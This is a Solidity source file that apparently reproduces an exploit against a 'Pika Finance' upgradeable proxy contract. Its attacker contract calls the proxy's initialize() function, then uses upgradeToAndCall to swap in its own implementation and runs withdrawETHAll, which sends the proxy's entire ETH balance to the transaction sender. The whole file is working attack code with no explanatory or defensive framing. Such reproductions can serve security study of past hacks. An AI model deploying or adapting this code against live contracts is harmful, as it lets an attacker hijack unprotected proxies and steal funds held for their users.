// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {NewExploitedStorage} from "./NewExploitedStorage.sol";

interface IPikaFinanceProxy {
    function initialize() external;

    function upgradeToAndCall(
        address _implementation,
        bytes memory _data
    ) external;
}

contract AttackerImplementation is NewExploitedStorage {
    function attack(IPikaFinanceProxy pikaFinanceProxy) public {
        pikaFinanceProxy.initialize();
        pikaFinanceProxy.upgradeToAndCall(
            address(this),
            abi.encodeWithSignature("withdrawETHAll()")
        );
    }

    function withdrawETHAll() public {
        payable(tx.origin).transfer(address(this).balance);
    }
}
